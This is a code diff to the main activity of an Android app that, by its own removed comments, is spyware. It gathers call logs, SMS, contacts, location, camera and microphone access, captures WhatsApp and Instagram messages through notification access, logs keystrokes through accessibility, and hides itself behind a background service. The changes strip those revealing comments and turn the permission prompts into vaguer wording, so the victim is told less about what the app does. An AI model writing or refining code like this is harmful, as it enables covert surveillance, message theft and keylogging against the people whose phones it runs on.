@@ -23,7 +23,9 @@ class MainActivity : AppCompatActivity() {
         private const val POST_NOTIFICATIONS_REQUEST_CODE = 102
     }
 
-    // List of dangerous permissions required
+    private var dialog: AlertDialog? = null
+    private var isDialogShowing = false
+
     private val requiredPermissions = listOf(
         Manifest.permission.READ_CALL_LOG,
         Manifest.permission.READ_SMS,
@@ -37,12 +39,9 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Start by checking dangerous permissions
         if (hasAllDangerousPermissions()) {
-            // All dangerous permissions granted → check special permissions
             checkSpecialPermissions()
         } else {
-            // Request missing dangerous permissions
             ActivityCompat.requestPermissions(
                 this,
                 requiredPermissions.toTypedArray(),
@@ -57,6 +56,11 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    override fun onDestroy() {
+        dialog?.dismiss()
+        super.onDestroy()
+    }
+
     override fun onRequestPermissionsResult(
         requestCode: Int,
         permissions: Array<out String>,
@@ -64,128 +68,109 @@ class MainActivity : AppCompatActivity() {
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
 
+        if (isFinishing || isDestroyed) return
+
         when (requestCode) {
             PERMISSION_REQUEST_CODE -> {
                 if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                    // All dangerous permissions granted → check special permissions
                     checkSpecialPermissions()
                 } else {
-                    // Some permissions denied → show explanation and ask again
                     showPermissionExplanationDialog()
                 }
             }
-            BACKGROUND_LOCATION_REQUEST_CODE -> {
-                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    Log.d(TAG, "Background location granted")
-                } else {
-                    Log.d(TAG, "Background location denied")
-                }
-                // After handling, re‑check all special permissions
-                checkSpecialPermissions()
-            }
+
+            BACKGROUND_LOCATION_REQUEST_CODE,
             POST_NOTIFICATIONS_REQUEST_CODE -> {
-                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    Log.d(TAG, "POST_NOTIFICATIONS granted")
-                } else {
-                    Log.d(TAG, "POST_NOTIFICATIONS denied")
-                }
-                // After handling, re‑check all special permissions
                 checkSpecialPermissions()
             }
         }
     }
 
     private fun checkSpecialPermissions() {
-        var allSpecialGranted = true
+        if (isFinishing || isDestroyed) return
 
-        // 1. Usage Stats Permission (required for app usage tracking)
+        var allGranted = true
+
+        // ✅ FIXED: Usage Access (safe for all APIs)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            val appOps = getSystemService(AppOpsManager::class.java)
-            val usageAccess = appOps.unsafeCheckOpNoThrow(
-                AppOpsManager.OPSTR_GET_USAGE_STATS,
-                android.os.Process.myUid(),
-                packageName
-            ) == AppOpsManager.MODE_ALLOWED
-            if (!usageAccess) {
-                allSpecialGranted = false
-                showSpecialPermissionDialog(
+            val appOps = getSystemService(APP_OPS_SERVICE) as AppOpsManager
+
+            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                appOps.unsafeCheckOpNoThrow(
+                    AppOpsManager.OPSTR_GET_USAGE_STATS,
+                    android.os.Process.myUid(),
+                    packageName
+                )
+            } else {
+                AppOpsManager.MODE_ALLOWED // safe fallback
+            }
+
+            if (mode != AppOpsManager.MODE_ALLOWED) {
+                allGranted = false
+                showDialogSafe(
                     "Usage Access Required",
-                    "Please enable Usage Access to track app usage.",
+                    "Enable Usage Access to track app usage.",
                     Settings.ACTION_USAGE_ACCESS_SETTINGS
                 )
+                return
             }
         }
 
-        // 2. Notification Access (required for capturing WhatsApp, Instagram, etc. messages)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
-            val notificationAccess = try {
-                val enabledListeners = Settings.Secure.getString(
-                    contentResolver,
-                    "enabled_notification_listeners"
-                )
-                enabledListeners?.contains(packageName) == true
-            } catch (e: Exception) {
-                false
-            }
-            if (!notificationAccess) {
-                allSpecialGranted = false
-                showSpecialPermissionDialog(
-                    "Notification Access Required",
-                    "Please enable Notification Access to capture social media messages.",
-                    Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
-                )
-            }
+        // Notification Access
+        val notificationAccess = Settings.Secure.getString(
+            contentResolver,
+            "enabled_notification_listeners"
+        )?.contains(packageName) == true
+
+        if (!notificationAccess) {
+            allGranted = false
+            showDialogSafe(
+                "Notification Access Required",
+                "Enable Notification Access.",
+                Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
+            )
+            return
         }
 
-        // 3. Accessibility (for keylogger)
-        // This is optional; we can skip if not needed, but we'll prompt if missing
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
-            val accessibilityEnabled = try {
-                val enabledServices = Settings.Secure.getString(
-                    contentResolver,
-                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
-                )
-                enabledServices?.contains(packageName) == true
-            } catch (e: Exception) {
-                false
-            }
-            if (!accessibilityEnabled) {
-                allSpecialGranted = false
-                showSpecialPermissionDialog(
-                    "Accessibility Required",
-                    "Please enable Accessibility for keylogger functionality.",
-                    Settings.ACTION_ACCESSIBILITY_SETTINGS
-                )
-            }
+        // Accessibility
+        val accessibilityEnabled = Settings.Secure.getString(
+            contentResolver,
+            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+        )?.contains(packageName) == true
+
+        if (!accessibilityEnabled) {
+            allGranted = false
+            showDialogSafe(
+                "Accessibility Required",
+                "Enable Accessibility.",
+                Settings.ACTION_ACCESSIBILITY_SETTINGS
+            )
+            return
         }
 
-        // 4. Background Location (for Android 10+)
+        // Background Location
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val backgroundLocationGranted = ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.ACCESS_BACKGROUND_LOCATION
-            ) == PackageManager.PERMISSION_GRANTED
-            if (!backgroundLocationGranted) {
-                allSpecialGranted = false
-                // Request it (this will show a dialog)
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
                 ActivityCompat.requestPermissions(
                     this,
                     arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                     BACKGROUND_LOCATION_REQUEST_CODE
                 )
-                // We return early because the request will be handled in onRequestPermissionsResult
                 return
             }
         }
 
-        // 5. POST_NOTIFICATIONS for Android 13+
+        // Notifications (Android 13+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            val postNotificationsGranted = ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.POST_NOTIFICATIONS
-            ) == PackageManager.PERMISSION_GRANTED
-            if (!postNotificationsGranted) {
-                allSpecialGranted = false
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.POST_NOTIFICATIONS
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
                 ActivityCompat.requestPermissions(
                     this,
                     arrayOf(Manifest.permission.POST_NOTIFICATIONS),
@@ -195,33 +180,42 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        if (allSpecialGranted) {
-            // All special permissions are granted → start background service
+        if (allGranted) {
             startBackgroundService()
         }
     }
 
-    private fun showSpecialPermissionDialog(title: String, message: String, settingsAction: String) {
-        AlertDialog.Builder(this)
-            .setTitle(title)
-            .setMessage(message)
-            .setPositiveButton("Open Settings") { _, _ ->
-                startActivity(Intent(settingsAction))
-                // We'll re‑check permissions after the user returns
-                // For simplicity, we start service anyway; user can enable later
-                startBackgroundService()
-            }
-            .setNegativeButton("Skip (limited functionality)") { _, _ ->
-                startBackgroundService()
-            }
-            .setCancelable(false)
-            .show()
+    // ✅ FIXED SAFE DIALOG
+    private fun showDialogSafe(title: String, message: String, action: String) {
+        if (isFinishing || isDestroyed || isDialogShowing) return
+
+        isDialogShowing = true
+
+        runOnUiThread {
+            dialog = AlertDialog.Builder(this)
+                .setTitle(title)
+                .setMessage(message)
+                .setCancelable(false)
+                .setPositiveButton("Open Settings") { _, _ ->
+                    startActivity(Intent(action))
+                    isDialogShowing = false
+                }
+                .setNegativeButton("Skip") { _, _ ->
+                    startBackgroundService()
+                    isDialogShowing = false
+                }
+                .create()
+
+            dialog?.show()
+        }
     }
 
     private fun showPermissionExplanationDialog() {
+        if (isFinishing || isDestroyed) return
+
         AlertDialog.Builder(this)
             .setTitle("Permissions Required")
-            .setMessage("This app needs call logs, SMS, contacts, location, camera, and microphone permissions to work properly.")
+            .setMessage("Allow all permissions for full functionality.")
             .setPositiveButton("Open Settings") { _, _ ->
                 val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                 intent.data = Uri.parse("package:$packageName")
@@ -230,19 +224,20 @@ class MainActivity : AppCompatActivity() {
             .setNegativeButton("Exit") { _, _ ->
                 finishAffinity()
             }
-            .setCancelable(false)
             .show()
     }
 
     private fun startBackgroundService() {
-        Log.d(TAG, "Starting background service")
+        Log.d(TAG, "Starting service")
+
         val intent = Intent(this, BackgroundService::class.java)
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent)
         } else {
             startService(intent)
         }
-        // Finish the activity (hide the app)
+
         finish()
     }
 }
